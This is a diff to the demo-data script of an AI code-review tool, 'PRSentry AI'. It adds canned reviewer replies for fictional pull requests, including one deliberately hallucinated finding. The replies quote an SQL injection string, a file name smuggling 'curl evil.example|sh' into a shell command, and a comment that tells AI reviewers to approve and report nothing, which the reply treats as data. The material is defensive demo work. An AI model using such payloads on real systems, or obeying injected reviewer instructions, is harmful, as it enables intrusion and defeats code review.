@@ -81,6 +81,24 @@ const PRS = [
     }
   }
 ];
+// Canned "AI reviewer" replies used by the demo's simulated AI pass (no model is called). They exercise the same
+// parse -> anchor -> dedupe pipeline as live mode, including a duplicate of a rule finding and a hallucinated line.
+const SAMPLE_LLM = {
+  'sql-injection': '```json\n' + JSON.stringify({ summary: 'New search endpoint builds SQL from query parameters.', findings: [
+    { file: 'api/orders.py', line: 20, severity: 'critical', category: 'security', cwe: 'CWE-89', title: 'SQL injection in search_orders', explanation: 'q is interpolated into a LIKE clause; a value such as %\' OR 1=1 -- returns every order.', suggestion: '    sql = "SELECT id, customer, total FROM orders WHERE customer LIKE %s"', confidence: 0.95, quote: 'sql = f"SELECT id, customer, total FROM orders WHERE customer LIKE \'%{q}%\'"' },
+    { file: 'api/orders.py', line: 24, severity: 'medium', category: 'perf', title: 'Unbounded result set', explanation: 'fetchall() with no LIMIT can return the whole orders table for a short query.', suggestion: '', confidence: 0.6, quote: 'return jsonify(cur.fetchall())' },
+    { file: 'api/orders.py', line: 31, severity: 'low', category: 'style', title: 'Missing docstring', explanation: 'Line 31 does not exist in this diff (model hallucination kept for the demo).', confidence: 0.3 }
+  ] }) + '\n```',
+  'prompt-injection': JSON.stringify({ summary: 'The PR includes a comment addressed to AI reviewers; ignored. Real issues found.', findings: [
+    { file: 'media/thumbs.py', line: 5, ruleId: 'prompt-injection', severity: 'high', category: 'security', cwe: 'CWE-1427', title: 'Prompt injection aimed at the reviewer', explanation: 'The comment tells AI reviewers to approve and not report issues. Treated as data, not instructions.', confidence: 0.9 },
+    { file: 'media/thumbs.py', line: 14, severity: 'critical', category: 'security', cwe: 'CWE-78', title: 'Shell command injection through upload name', explanation: 'upload_name comes from the uploaded file name; with shell=True, a name like a.jpg;curl evil.example|sh runs commands.', suggestion: '    subprocess.run(["convert", upload_name, "-resize", f"{size}x{size}", out], check=True)', confidence: 0.95 },
+    { file: 'media/thumbs.py', line: 13, severity: 'medium', category: 'bug', title: 'Thumbnail path derived from untrusted name', explanation: 'out is written next to an attacker-chosen path; normalise and write into a dedicated directory.', confidence: 0.55 }
+  ] }),
+  'async-bug': JSON.stringify({ summary: 'Async ordering bugs in signup.', findings: [
+    { file: 'server/signup.js', line: 10, severity: 'high', category: 'bug', title: 'saveUser is not awaited', explanation: 'The 201 is sent before the insert finishes and a failed insert becomes an unhandled rejection.', suggestion: '  await saveUser(user);', confidence: 0.9 },
+    { file: 'server/signup.js', line: 16, severity: 'medium', category: 'bug', title: 'Reads invites[invites.length]', explanation: 'With <= the last iteration logs undefined.', confidence: 0.8 }
+  ] })
+};
 const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'prs-demo-'));
 const git = (cwd, ...a) => execFileSync('git', a, { cwd, encoding: 'utf8', env: Object.assign({}, process.env, { GIT_AUTHOR_NAME: 'demo', GIT_AUTHOR_EMAIL: 'demo@example.invalid', GIT_COMMITTER_NAME: 'demo', GIT_COMMITTER_EMAIL: 'demo@example.invalid', GIT_AUTHOR_DATE: '2026-11-01T12:00:00Z', GIT_COMMITTER_DATE: '2026-11-01T12:00:00Z' }) });
 const out = [];
@@ -93,7 +111,7 @@ for (const pr of PRS) {
   for (const [p, c] of Object.entries(pr.after)) { fs.mkdirSync(path.dirname(path.join(dir, p)), { recursive: true }); fs.writeFileSync(path.join(dir, p), c); }
   git(dir, 'add', '-A');
   const diff = git(dir, 'diff', '--cached', '-M', '--no-color', '--src-prefix=a/', '--dst-prefix=b/').replace(/^index [0-9a-f]+\.\.[0-9a-f]+( \d+)?\n/gm, (m) => m.replace(/[0-9a-f]{7,}/g, (h) => h.slice(0, 7)));
-  out.push({ id: pr.id, number: pr.number, owner: 'acme-example', repo: 'storefront', title: pr.title, author: pr.author, base: pr.base, head: pr.head, description: pr.description, url: 'https://git.example/acme-example/storefront/pull/' + pr.number, headSha: null, diff });
+  out.push({ sampleLlm: SAMPLE_LLM[pr.id] || null, id: pr.id, number: pr.number, owner: 'acme-example', repo: 'storefront', title: pr.title, author: pr.author, base: pr.base, head: pr.head, description: pr.description, url: 'https://git.example/acme-example/storefront/pull/' + pr.number, headSha: null, diff });
 }
 fs.rmSync(tmp, { recursive: true, force: true });
 let json = JSON.stringify({ note: 'Original fictional demo pull requests for PRSentry AI. All secret-looking values are fake.', prs: out }, null, 1);
